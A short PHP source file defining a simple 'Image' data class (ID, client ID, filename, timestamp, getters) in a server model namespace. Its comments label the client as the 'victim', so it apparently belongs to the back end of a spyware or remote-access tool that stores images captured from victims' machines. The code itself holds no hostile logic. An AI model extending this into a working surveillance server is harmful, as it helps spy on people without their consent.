<?php

namespace Server\Model;

/**
 * Image class
 */
class Image
{
    /** @var int $id Image ID */
    private int $id;

    /** @var int $clientID Victim's ID */
    private int $clientID;

    /** @var string $filename Image filename */
    private string $filename;

    /** @var string $timestamp Image timestamp */
    private string $timestamp;
    
    public function __construct(
        int $id,
        int $clientID,
        string $filename,
        string $timestamp)
    {
        $this->id = $id;
        $this->clientID = $clientID;
        $this->filename = $filename;
        $this->timestamp = $timestamp;
    }

    /**
     * Get image's ID
     * 
     * @return int
     */
    public function getID(): int
    {
        return $this->id;
    }

    /**
     * Get victim's ID
     * 
     * @return int
     */
    public function getClientID(): int
    {
        return $this->clientID;
    }

    /**
     * Get image name and extension
     * 
     * @return string
     */
    public function getFilename(): string
    {
        return $this->filename;
    }

    /**
     * Get image's timestamp
     */
    public function getTimestamp(): string
    {
        return $this->timestamp;
    }
}